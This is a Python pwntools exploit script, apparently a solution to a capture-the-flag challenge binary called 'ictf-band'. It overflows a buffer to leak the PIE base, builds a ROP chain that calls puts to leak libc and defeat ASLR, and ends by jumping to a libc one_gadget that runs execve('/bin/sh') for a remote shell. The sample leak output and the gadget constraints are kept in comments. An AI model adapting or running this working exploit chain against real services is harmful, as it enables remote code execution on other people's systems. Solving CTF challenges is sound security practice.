from pwn import * 
import os 

# os.system('clear')
def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript="""
continue
"""

exe = './ictf-band'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'
#context.log_level = 'DEBUG'

library = './libc.so.6'
libc = context.binary = ELF(library, checksec=False)

def name_song(index, genre, title):
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', f'{index}')
    sh.sendlineafter(b':', f'{genre}')
    sh.sendlineafter(b':', f'{title}')
    
def join():
    sh.sendlineafter(b'>', b'2')
    
def write_lyr(lyrics):
    sh.sendlineafter(b'>', b'3')
    sh.sendlineaftera(b':', f'{lyrics}')
    
def zeroalbm(index, count, validate, buffer, data):
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', f'{index}')
    sh.sendlineafter(b':', f'{count}')
    sh.sendlineafter(b':', f'{validate}')
    sh.sendlineafter(b':', f'{buffer}')
    sh.sendlineafter(b':', data)

def ext(data, length, pload):
    sh.sendlineafter(b'>', b'4')
    sh.sendlineafter(b':', f'{data}')
    sh.sendlineafter(b':', f'{length}')
    sh.sendlineafter(b':', pload)

sh = start()

#sh.timeout = 0.1

#### ====== LEAK PIE & CALCULATE PIE BASE ====== ####

'''
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined FUN_001022e6()
             undefined         AL:1           <RETURN>
                             FUN_001022e6                                    XREF[3]:     entry:001011f8(*), 00103770, 
                                                                                          00103968(*)  
        001022e6 f3 0f 1e fa     ENDBR64
        001022ea 55              PUSH       RBP
        001022eb 48 89 e5        MOV        RBP,RSP
        001022ee b8 00 00        MOV        EAX,0x0
                 00 00
        001022f3 e8 d1 ef        CALL       FUN_001012c9                                     undefined FUN_001012c9()
                 ff ff
        001022f8 b8 00 00        MOV        EAX,0x0
                 00 00
        001022fd e8 4f fe        CALL       FUN_00102151                                     undefined FUN_00102151()
                 ff ff
        00102302 b8 00 00        MOV        EAX,0x0
                 00 00
        00102307 5d              POP        RBP
        00102308 c3              RET

'''
log.progress(f'BYPASSING PIE PROTECTIONS')
p = flat([
    cyclic(0x167),
    p8(0xeb) # b'\xeb'
])

pload = len(p) + 0x1
ext(asm('nop') * 0x8, str(pload), p)

sh.recvuntil(b'adoaa')
get = unpack(sh.recv(6) + b'\x00' * 2)
success(f'PIE LEAK --> {hex(get)}')
elf.address = get - 0x22eb
success(f'PIE BASE --> {hex(elf.address)}')

'''
[+] PIE LEAK --> 0x55cd5d5252eb
[+] PIE BASE --> 0x55cd5d523000
[*] running in new terminal: ['/usr/bin/gdb', '-q', './ictf-band', '6671']
'''

log.progress(f'FINISHED BYPASSING PIE')

#### ====== END OF LEAK PIE & CALCULATE PIE BASE ====== ####

#### ====== ASLR LEAK & CALCULATE LIBC BASE ====== ####
log.progress(f'BYPASSING ASLR')
# printf_base = elf.sym['printf'] --> failed to leak libc using printf
# log.info(f'printf@plt --> {hex(printf_base)}')

printf_base = elf.sym['puts']
log.info(f'printf@plt --> {hex(printf_base)}')

get_persona = elf.address + 0x1e8b
log.info(f'VULN FUNC --> {hex(get_persona)}')

p = flat([
    cyclic(0x167),
    printf_base,
    elf.address + 0x1e8b,   
])
pload = len(p) + 0x1
ext(asm('nop') * 0x8, str(pload), p)

sh.recvuntil(b'ved!')
sh.recvuntil(b'dnaadoaa')
sh.recvline()
get = unpack(sh.recv(6) + b'\x00' * 2)
log.success(f'LIBC LEAK --> {hex(get)}')

libc.address = get - 0x62050
success(f'LIBC BASE --> {hex(libc.address)}')

'''
[*] printf@plt --> 0x562ced150124
[*] VULN FUNC --> 0x562ced150e8b
[+] LIBC LEAK --> 0x7f6335262050
[+] LIBC BASE --> 0x7f6335200000
'''

log.progress(f' FINISHED BYPASSING ASLR')
#### ====== END OF ASLR LEAK & CALCULATE LIBC BASE ====== ####

'''
0x50a47 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''

gadget = (0x50a47, 0xebc81, 0xebc85, 0xebc88)
bss_offset = elf.bss()+0x78
log.success(f'.BSS ADDR --> {hex(bss_offset)}')
p = flat([
    cyclic(0x15f),
    bss_offset,
    libc.address + gadget[2]
])
pload = len(p) + 0x1

##### [+] GAINED RCE
sh.sendlineafter(b':', str(pload))
sh.sendlineafter(b':', p)

# gdb.attach(sh)
sh.interactive()
